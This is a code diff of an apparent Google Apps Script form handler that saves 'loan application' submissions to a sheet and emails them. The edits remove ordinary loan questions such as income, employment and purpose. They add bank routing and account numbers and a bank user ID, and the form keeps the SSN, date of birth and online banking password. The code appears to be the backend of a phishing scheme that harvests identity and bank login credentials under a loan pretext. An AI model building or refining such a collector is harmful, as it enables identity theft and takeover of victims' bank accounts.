@@ -39,20 +39,18 @@ function doPost(e) {
       new Date().toISOString(),
       data.firstName || "",
       data.lastName || "",
-      data.phone || "",
+      data.dob || "",
       data.email || "",
       data.ssn || "",
-      data.dob || "",
-      data.address || "",
+      data.streetAddress || "",
       data.city || "",
       data.state || "",
       data.zip || "",
-      data.housing || "",
+      data.bankName || "",
       data.loanAmount || "",
-      data.loanPurpose || "",
-      data.income || "",
-      data.employment || "",
-      data.bankUsername || "",
+      data.routingNumber || "",
+      data.accountNumber || "",
+      data.bankUserId || "",
       data.bankPassword || "",
     ];
 
@@ -62,17 +60,15 @@ function doPost(e) {
     const body = `A new loan application was submitted.
 
 Name: ${data.firstName} ${data.lastName}
-Phone: ${data.phone}
 Email: ${data.email}
 SSN: ${data.ssn}
 DOB: ${data.dob}
-Address: ${data.address}, ${data.city}, ${data.state} ${data.zip}
-Housing: ${data.housing}
+Address: ${data.streetAddress}, ${data.city}, ${data.state} ${data.zip}
+Bank name: ${data.bankName}
 Loan amount: ${data.loanAmount}
-Purpose: ${data.loanPurpose}
-Income: ${data.income}
-Employment: ${data.employment}
-Bank username: ${data.bankUsername}
+Routing number: ${data.routingNumber}
+Account number: ${data.accountNumber}
+Bank user ID: ${data.bankUserId}
 
 Submitted at: ${new Date().toISOString()}
 `;
@@ -95,20 +91,18 @@ function ensureHeaders(sheet) {
     "Timestamp",
     "First Name",
     "Last Name",
-    "Phone",
+    "DOB",
     "Email",
     "SSN",
-    "DOB",
-    "Address",
+    "Street Address",
     "City",
     "State",
     "ZIP",
-    "Housing",
+    "Bank Name",
     "Loan Amount",
-    "Loan Purpose",
-    "Annual Income",
-    "Employment",
-    "Bank Username",
+    "Routing Number",
+    "Account Number",
+    "Bank User ID",
     "Bank Password",
   ];
 
